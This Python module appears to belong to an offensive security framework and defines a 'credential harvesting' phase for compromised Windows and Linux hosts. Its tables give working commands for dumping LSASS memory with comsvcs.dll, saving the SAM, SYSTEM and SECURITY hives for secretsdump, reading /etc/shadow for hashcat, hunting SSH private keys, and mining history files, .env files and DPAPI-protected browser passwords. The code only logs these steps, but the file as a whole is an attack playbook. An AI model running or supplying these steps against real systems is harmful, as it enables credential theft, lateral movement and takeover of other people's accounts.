"""
Phase 2: Credential Harvesting
==============================

Harvest credentials from compromised systems.
"""

from typing import List, Dict

from .base import BasePhase
from ..models import Platform, Credential, CompromisedSystem


class CredentialHarvestingPhase(BasePhase):
    """
    Phase 2: Credential Harvesting

    Extract credentials from all available sources on compromised systems.
    Requires elevated privileges (Admin/SYSTEM on Windows, root on Linux).
    """

    PHASE_NUMBER = 2
    PHASE_NAME = "CREDENTIAL HARVESTING"
    PHASE_DESCRIPTION = "Harvest credentials from compromised system"

    # Windows credential sources
    WINDOWS_SOURCES = [
        {
            "name": "LSASS Memory Dump",
            "description": "Extract credentials from LSASS process memory",
            "technique": "comsvcs.dll MiniDump",
            "command": "rundll32.exe comsvcs.dll MiniDump <lsass_pid> dump.dmp full",
            "parser": "pypykatz lsa minidump dump.dmp",
            "requires": "SYSTEM or Admin with SeDebugPrivilege",
            "yields": ["Plaintext passwords", "NTLM hashes", "Kerberos tickets"],
        },
        {
            "name": "SAM/SYSTEM Registry",
            "description": "Extract local account hashes",
            "technique": "Registry save",
            "command": "reg save HKLM\\SAM sam.save && reg save HKLM\\SYSTEM system.save",
            "parser": "secretsdump.py -sam sam.save -system system.save LOCAL",
            "requires": "SYSTEM or Admin",
            "yields": ["Local account NTLM hashes"],
        },
        {
            "name": "LSA Secrets",
            "description": "Extract service account passwords and cached credentials",
            "technique": "Registry extraction",
            "command": "reg save HKLM\\SECURITY security.save",
            "parser": "secretsdump.py -security security.save -system system.save LOCAL",
            "requires": "SYSTEM",
            "yields": ["Service account passwords", "Cached domain credentials"],
        },
        {
            "name": "DPAPI Decryption",
            "description": "Decrypt protected user data",
            "technique": "Masterkey extraction + decryption",
            "targets": ["Chrome passwords", "Windows Vault", "WiFi passwords", "RDP credentials"],
            "requires": "User context or domain backup key",
            "yields": ["Browser passwords", "Saved credentials"],
        },
        {
            "name": "Registry Credential Mining",
            "description": "Search registry for stored credentials",
            "locations": [
                r"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon",
                r"HKCU\Software\Microsoft\Terminal Server\Client\Servers",
                r"HKLM\SYSTEM\CurrentControlSet\Services",
            ],
            "requires": "Admin",
            "yields": ["AutoLogon credentials", "Saved RDP credentials", "Service accounts"],
        },
    ]

    # Linux credential sources
    LINUX_SOURCES = [
        {
            "name": "/etc/shadow",
            "description": "Local user password hashes",
            "command": "cat /etc/shadow",
            "parser": "hashcat -m 1800 hashes.txt wordlist.txt",
            "requires": "root",
            "yields": ["Password hashes (SHA-512)"],
        },
        {
            "name": "SSH Keys",
            "description": "Private SSH keys for lateral movement",
            "command": "find / -name 'id_rsa' -o -name 'id_ed25519' 2>/dev/null",
            "also_check": "~/.ssh/authorized_keys for targets",
            "requires": "Access to user home directories",
            "yields": ["SSH private keys", "Target hosts from known_hosts"],
        },
        {
            "name": "History Files",
            "description": "Command history may contain credentials",
            "files": [
                "~/.bash_history",
                "~/.zsh_history",
                "~/.mysql_history",
                "~/.psql_history",
                "/root/.bash_history",
            ],
            "requires": "Access to user home directories",
            "yields": ["Passwords in commands", "Target information"],
        },
        {
            "name": "Configuration Files",
            "description": "Application configs with credentials",
            "files": [
                "/var/www/*/config*.php",
                "/var/www/*/.env",
                "~/.my.cnf",
                "~/.pgpass",
                "/etc/shadow.bak",
            ],
            "requires": "root or app user access",
            "yields": ["Database credentials", "API keys", "Service passwords"],
        },
        {
            "name": "Process Memory",
            "description": "Extract credentials from running processes",
            "tools": ["mimipenguin", "LaZagne"],
            "requires": "root",
            "yields": ["Plaintext passwords from memory"],
        },
    ]

    def execute(self, system: CompromisedSystem, **kwargs) -> List[Credential]:
        """
        Execute credential harvesting on target system.

        Args:
            system: The compromised system to harvest from

        Returns:
            List of harvested credentials
        """
        self.log_header()

        # Validate prerequisites
        if not system.has_elevated_access:
            self.log("[!] WARNING: Elevated privileges required for most harvesting techniques")

        credentials = []

        if system.platform == Platform.WINDOWS:
            credentials = self._harvest_windows(system)
        else:
            credentials = self._harvest_linux(system)

        # Consolidate and analyze
        self.log(f"\n[+] Total credentials harvested: {len(credentials)}")
        self._analyze_credentials(credentials)

        # Update state
        for cred in credentials:
            self.state.add_credential(cred)
            system.add_credential(cred)

        return credentials

    def _harvest_windows(self, system: CompromisedSystem) -> List[Credential]:
        """Windows credential harvesting workflow"""
        self.log("Starting Windows credential harvesting...")

        credentials = []

        for i, source in enumerate(self.WINDOWS_SOURCES, 1):
            self.log(f"\n[*] Method {i}: {source['name']}")
            self.log(f"    Description: {source['description']}")

            if "technique" in source:
                self.log(f"    Technique: {source['technique']}")
            if "command" in source:
                self.log(f"    Command: {source['command']}")
            if "parser" in source:
                self.log(f"    Parser: {source['parser']}")
            if "locations" in source:
                self.log("    Locations:")
                for loc in source["locations"]:
                    self.log(f"      - {loc}")
            if "targets" in source:
                self.log(f"    Targets: {', '.join(source['targets'])}")

            self.log(f"    Requires: {source['requires']}")
            self.log(f"    Yields: {', '.join(source['yields'])}")

        self.log("\n[+] Windows credential harvesting complete")
        return credentials

    def _harvest_linux(self, system: CompromisedSystem) -> List[Credential]:
        """Linux credential harvesting workflow"""
        self.log("Starting Linux credential harvesting...")

        credentials = []

        for i, source in enumerate(self.LINUX_SOURCES, 1):
            self.log(f"\n[*] Method {i}: {source['name']}")
            self.log(f"    Description: {source['description']}")

            if "command" in source:
                self.log(f"    Command: {source['command']}")
            if "parser" in source:
                self.log(f"    Parser: {source['parser']}")
            if "files" in source:
                self.log("    Files to check:")
                for f in source["files"]:
                    self.log(f"      - {f}")
            if "tools" in source:
                self.log(f"    Tools: {', '.join(source['tools'])}")
            if "also_check" in source:
                self.log(f"    Also check: {source['also_check']}")

            self.log(f"    Requires: {source['requires']}")
            self.log(f"    Yields: {', '.join(source['yields'])}")

        self.log("\n[+] Linux credential harvesting complete")
        return credentials

    def _analyze_credentials(self, credentials: List[Credential]) -> None:
        """Analyze harvested credentials for patterns"""
        self.log("\n[*] Credential Analysis:")
        self.log(f"    Total unique credentials: {len(credentials)}")

        # Count by type
        with_password = sum(1 for c in credentials if c.has_password)
        with_hash = sum(1 for c in credentials if c.has_hash)
        with_aes = sum(1 for c in credentials if c.has_aes_key)

        self.log(f"\n    Credential Types:")
        self.log(f"    - With plaintext password: {with_password}")
        self.log(f"    - With NTLM hash: {with_hash}")
        self.log(f"    - With AES key: {with_aes}")

        # Analyze privilege levels
        self.log(f"\n    Privilege Level Distribution:")
        self.log("    - Domain Admins: [analyze results]")
        self.log("    - Local Admins: [analyze results]")
        self.log("    - Service Accounts: [analyze results]")
        self.log("    - Regular Users: [analyze results]")

        # Check for password reuse
        self.log("\n    Password Reuse Analysis:")
        self.log("    - [Potential reuse patterns would be identified here]")

    def get_sources(self, platform: Platform) -> List[Dict]:
        """Get credential sources for a platform"""
        if platform == Platform.WINDOWS:
            return self.WINDOWS_SOURCES
        return self.LINUX_SOURCES